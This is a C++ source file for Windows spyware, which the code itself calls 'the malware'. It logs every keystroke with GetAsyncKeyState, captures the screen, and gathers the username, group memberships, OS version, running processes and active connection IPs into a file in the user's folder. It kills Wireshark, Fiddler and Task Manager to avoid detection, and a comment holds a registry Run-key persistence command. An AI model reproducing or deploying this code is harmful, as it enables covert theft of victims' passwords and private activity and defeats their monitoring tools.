#define _CRT_SECURE_NO_WARNINGS
#include "Round.h"

//kill process: taskkill /F /IM Wireshark.exe
//REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v bitt /t REG_SZ /d "C:\Program Files\qBittorrent\qbittorrent.exe"

int Round::amountOfRounds = 0;


/*
Constructor of a round
input: the name of the file that the data will be written to
output: new object of type Round
*/
Round::Round(string outputFileName)
{
	this->amountOfRounds++;
	this->_outputFileName = outputFileName;
	this->_runThreads = true;
	
	//std::cout << "constructor \n\n";
}


/*
the () operator will start all the actions of the malware
*/
void Round::operator()()
{
	//std::cout << "()" << std::endl;

	// detect processes must be first because we close tools like wirshark here
	this->threads.push_back(thread(&Round::detectProcesses, this));

	//start detecting keystrokes
	this->threads.push_back(thread(&Round::detectKeyStrokes, this));

	takeScreenshot();

	this->threads.push_back(thread(&Round::findActiveIpAddresses, this));
	findHostUsername();
	findGroups();

	try
	{
		findSystemVersion();
	}
	catch (exception ex)
	{
		this->_systemVersion = "unknown";
	}

	try
	{
		findHostIp();
	}
	catch (exception ex)
	{
		this->_hostIp = "unknown";
	}
}


/*
distructor of a round, will write the data to a txt file
input: none
output: none
*/
Round::~Round()
{
	//std::cout << "distructor" << std::endl;
	
	//join threads here
	this->_runThreads = false;
	for (vector<thread>::iterator it = this->threads.begin(); it != this->threads.end(); it++)
	{
		it->join();
	}	

	//----------------------- save screenshot  --------------------------
	this->_screenshot.Save((PATH[0] + this->_currentUserName + PATH[1] + "\\" + 
		FOLDER_NAME + "\\" + this->_outputFileName + ".jpg").c_str()); 
	//-------------------------------------------------------------------

	ofstream outFile(PATH[0] + this->_currentUserName + PATH[1] + "\\" + FOLDER_NAME + "\\" + this->_outputFileName + ".txt");


	//----------------------- keystrokes  --------------------------
	outFile << "Keystrokes that was detected:" << std::endl;
	while (!this->_keyStrokes.empty())
	{
		outFile << this->_keyStrokes.front();
		this->_keyStrokes.pop();
	}

	outFile << std::endl;
	//--------------------------------------------------------------

	//------------- ip addresses (active conections)  --------------
	outFile << "Destination ip addresses of active connections:" << std::endl;
	for (vector<string>::iterator it = this->_activeIpAddresses.begin();
		it != this->_activeIpAddresses.end(); it++)//run over all ip addresses
	{
		outFile << "*" << *it << std::endl;
	}

	outFile << std::endl;
	//--------------------------------------------------------------

	//----------------------- host user name -----------------------
	outFile << "Host username: " << this->_currentUserName << std::endl << std::endl;
	//--------------------------------------------------------------

	//------------------- groups of the user -----------------------
	outFile << "groups: " << std::endl;

	for (vector<string>::iterator it = this->_groups.begin();
		it != this->_groups.end(); it++)//run over all ip addresses
	{
		outFile << "*" << *it << std::endl;
	}

	outFile << std::endl;
	//--------------------------------------------------------------

	//----------------- operating system version -------------------
	outFile << "Operating system version: " << this->_systemVersion << std::endl << std::endl;
	//--------------------------------------------------------------

	//------------------- active processes -------------------------
	outFile << "Active processes: " << std::endl;

	for (vector<string>::iterator it = this->_processes.begin();
		it != this->_processes.end(); it++)//run over all ip addresses
	{
		outFile << "*" << *it << std::endl;
	}

	outFile << std::endl;
	//--------------------------------------------------------------

	//--------------------- Host ip address ------------------------
	outFile << "Host's IP address: " << this->_hostIp << std::endl << std::endl;
	//--------------------------------------------------------------

	outFile.close();
}


/*
The function will find the ip address of the host machine and save it in the object's attribute
input: none
output: none
*/
void Round::findHostIp()
{
	//TODO: chagne the ip finding way not (192)
	string ipAddr = execute("ipconfig | findstr / C:\"IPv4 Address\"", "ipconfigResult.txt");
	try {
		ipAddr = ipAddr.substr(ipAddr.find("192"));
		ipAddr = ipAddr.substr(0, ipAddr.find("\n"));
	}
	catch (exception e)
	{
		throw exception("unable to find ip addr");
	}


	this->_hostIp = ipAddr;
	
	//std::cout << this->_hostIp;
}


/*
The function will kill the processes of programs that might disturb the malware
**CONDITION: this->_processes mustn't be empty
input: none
output: none
*/
void Round::closePrograms()
{
	const int NUM_OF_PROGRAMS = 3;
	const string evilPrograms[NUM_OF_PROGRAMS] = {"Wireshark.exe","Fiddler.exe","Taskmgr.exe"};

	for (int i = 0; i < NUM_OF_PROGRAMS; i++)
	{
		if (std::find(this->_processes.begin(), this->_processes.end(), evilPrograms[i]) != this->_processes.end()) // process runs in computer
		{
			system(("taskkill /F /IM " + evilPrograms[i] + " >> taskkillres.txt").c_str());
			std::remove("taskkillres.txt");
		}
	}
}

/*
The function will detect key strokes and create a keylogger (string) contains those keystrokes
input: none
output: a keylogger contains the key strokes
*/
void Round::detectKeyStrokes()
{
	//std::cout << "\nstart key strokes\n";
	const int MIN_KEY_VALUE = 8;
	const int MAX_KEY_VALUE = 255;
	const int SUCCESS = -32767; // Bin value: 0111-1111-1111-1111
	//success specifies that the key was clicked in the right terms

	while (this->_runThreads)
	{
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == SUCCESS) {
				this->_keyStrokes.push(getPrintableKey(i));
			}
		}
	}
}


/*
The function will find the name of the computer host and add it to the object's attributes
input: none
output: none
*/
void Round::findHostUsername()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	this->_currentUserName = username;

	//std::cout << this->_currentUserName;
}

/*
the function will find the groups that the machine host is a part of
input: none
output: none
*/
void Round::findGroups()
{
	std::system("WHOAMI /GROUPS /FO CSV /NH >> groups.txt"); // redirect output to file

	// open file for input, return string containing characters in the file
	std::ifstream file("groups.txt");

	string line, groupname;

	while (std::getline(file, line))
	{
		line = line.substr(1);
		groupname = line.substr(0, line.find("\""));
		this->_groups.push_back(groupname);

		//std::cout << groupname << std::endl;
	}

	file.close();

	std::remove("groups.txt");
}

/*
The function will find the version of the operating system
input: none
output: none
*/
void Round::findSystemVersion()
{
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW info;

	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (NULL != RtlGetVersion)
	{
		info.dwOSVersionInfoSize = sizeof(info);
		RtlGetVersion(&info);

		std::ostringstream stream;

		stream << "Win " <<info.dwMajorVersion << "." << info.dwMinorVersion;

		this->_systemVersion = stream.str();

		//std::cout << this->_systemVersion;
	}
	else
	{
		throw exception("can't find system version");
	}
}


/*
The function will detect the processes that runs in the computer and add them
input: none 
output: none
*/
void Round::detectProcesses()
{
	std::system("tasklist >> processes.txt"); // redirect output to file

	// open file for input, return string containing characters in the file
	std::ifstream file("processes.txt");

	string line, process;
	while (std::getline(file, line))
	{
		process = line.substr(0, line.find(".exe") + 4);
		if (process.find(".exe") != std::string::npos)
		{
			this->_processes.push_back(process);
		}
	}

	file.close();

	std::remove("processes.txt");

	if (this->amountOfRounds == 1)
	{
		closePrograms();
	}

	while (this->_runThreads)
	{
		std::system("tasklist >> processes.txt"); // redirect output to file

		// open file for input, return string containing characters in the file
		std::ifstream file("processes.txt");

		string line, process;
		while (std::getline(file, line))
		{
			process = line.substr(0, line.find(".exe") + 4);
			if (process.find(".exe") != std::string::npos)
			{
				this->_processes.push_back(process);
			}
		}

		file.close();

		std::remove("processes.txt");

		std::this_thread::sleep_for(std::chrono::seconds(5));
		//remove duplicates from vector
		std::sort(this->_processes.begin(), this->_processes.end());
		this->_processes.erase(unique(this->_processes.begin(),
			this->_processes.end()), this->_processes.end());
	}
}


/*
The function will take a screenshot of the user's screen
input:
output: none
*/
void Round::takeScreenshot()
{
	// get the device context of the screen
	HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	// and a device context to put it in
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);

	//checking these are positive values
	if (width > 0 && height > 0)
	{
		HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

		// get a new bitmap
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

		BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
		hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

		this->_screenshot.Attach(hBitmap);

		/*
		--Save-File-In-Clipboard--
	
		OpenClipboard(NULL);
		EmptyClipboard();
		SetClipboardData(CF_BITMAP, hBitmap);
		CloseClipboard();
		*/

		// clean up
		DeleteDC(hMemoryDC);
		DeleteDC(hScreenDC);
	}

}

/*
the function will find the ip addresses that the machine talks with and save them in the object
input: none
output: none
*/
void Round::findActiveIpAddresses()
{
	while (this->_runThreads)
	{
		std::system("netstat -n >> ipaddresses.txt"); // redirect output to file

		// open file for input, return string containing characters in the file
		std::ifstream file("ipaddresses.txt");
	
		string line, ipaddr;
		while (std::getline(file, line))
		{
			if (std::count(line.begin(), line.end(), '.') >= 6) // line with ip addr
			{
				line = line.substr(line.rfind(".") - 11);
				line = line.substr(0, line.find(":"));
				ipaddr = line.substr(line.rfind(" ") + 1);
			
				//std::cout << ipaddr << std::endl;
				if (ipaddr.find("127.0.0.1") == string::npos)
				{
					this->_activeIpAddresses.push_back(ipaddr);
				}
			}
		}

		file.close();

		std::remove("ipaddresses.txt");

		std::this_thread::sleep_for(std::chrono::seconds(5));
		//remove duplicates from vector
		std::sort(this->_activeIpAddresses.begin(), this->_activeIpAddresses.end());
		this->_activeIpAddresses.erase(unique(this->_activeIpAddresses.begin(), 
			this->_activeIpAddresses.end()), this->_activeIpAddresses.end());
	}
}



//--------------temp functions ---------------------------

/*
the function will run a command and return a string conatains the results of the command
input: the command to run, and a file name that the results will be saved in (for limited minimal time)
output: string conatains the results of the command
*/
std::string Round::execute(std::string cmd, std::string fileName)
{
	std::system((cmd + " >> " + fileName).c_str()); // redirect output to file

	// open file for input, return string containing characters in the file
	std::ifstream file(fileName);
	string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

	file.close();

	std::remove(fileName.c_str());

	return fileContent;

	/*
	//another way of doing this, maybe better?
	std::string exec(const char* cmd) {
		std::array<char, 128> buffer;
		std::string result;
		std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
		if (!pipe) {
			throw std::runtime_error("popen() failed!");
		}
		while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
			result += buffer.data();
		}
		return result;
	}*/
}

/*
the function will return the printable shape of the keyCode
input: the keycode of the keystroke
output: true/false if the key Code is printable or not
*/
string Round::getPrintableKey(int keyCode)
{
	string printable = "";

	switch (keyCode)
	{
	case VK_SPACE:
		printable = "[SPACE]";
		break;
	case VK_SHIFT:
		printable = "[SHIFT]";
		break;
	case VK_TAB:
		printable = "[TAB]";
		break;
	case VK_BACK:
		printable = "[BACKSPACE]";
		break;
	case VK_RETURN:
		printable = "[ENTER]";
		break;
	case VK_CONTROL:
		printable = "[CTRL]";
		break;
	case VK_MENU:
		printable = "[ALT]";
		break;
	case VK_CAPITAL:
		printable = "[CAPS LOCK]";
		break;
	case VK_ESCAPE:
		printable = "[ESC]";
		break;
	case VK_DELETE:
		printable = "[DEL]";
		break;
	case VK_PAUSE:
		printable = "[PAUSE]";
		break;
	case VK_PRIOR:
		printable = "[PgUp]";
		break;
	case VK_NEXT:
		printable = "[PgDn]";
		break;
	case VK_LEFT:
		printable = "[LEFT ARROW]";
		break;
	case VK_UP:
		printable = "[UP ARROW]";
		break;
	case VK_RIGHT:
		printable = "[RIGHT ARROW]";
		break;
	case VK_DOWN:
		printable = "[DOWN ARROW]";
		break;
	case VK_NUMPAD0:
		printable = "0";
		break;
	case VK_NUMPAD1:
		printable = "1";
		break; 
	case VK_NUMPAD2:
		printable = "2";
		break;
	case VK_NUMPAD3:
		printable = "3";
		break;
	case VK_NUMPAD4:
		printable = "4";
		break;
	case VK_NUMPAD5:
		printable = "5";
		break;
	case VK_NUMPAD6:
		printable = "6";
		break;
	case VK_NUMPAD7:
		printable = "7";
		break;
	case VK_NUMPAD8:
		printable = "8";
		break;
	case VK_NUMPAD9:
		printable = "9";
		break;
	case VK_F1:
		printable = "[F1]";
		break;
	case VK_F2:
		printable = "[F2]";
		break;
	case VK_F3:
		printable = "[F3]";
		break;
	case VK_F4:
		printable = "[F4]";
		break;
	case VK_F5:
		printable = "[F5]";
		break;
	case VK_F6:
		printable = "[F6]";
		break;
	case VK_F7:
		printable = "[F7]";
		break;
	case VK_F8:
		printable = "[F8]";
		break;
	case VK_F9:
		printable = "[F9]";
		break;
	case VK_F10:
		printable = "[F10]";
		break;
	case VK_F11:
		printable = "[F11]";
		break;
	case VK_F12:
		printable = "[F12]";
		break;

	default:
		char ch;
		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			ch = (char)keyCode;
		else
			ch = (char)(keyCode + 32);
		
		printable = ch;
		break;
	}

	return printable;
}

/*
the function will cast a virtual key code to a printable string
input: virtual keyCode
output: a printable string
*/
std::string Round::castVkeyToString(unsigned int vkey)
{
	TCHAR lpszName[256];
	if (!GetKeyNameText(vkey, lpszName, sizeof(lpszName)))
	{
		//maybe? Or throw std::systemerror(GetLastError(), std::system_category())
		return std::string("unknown key");
	}
	return std::string(lpszName);
}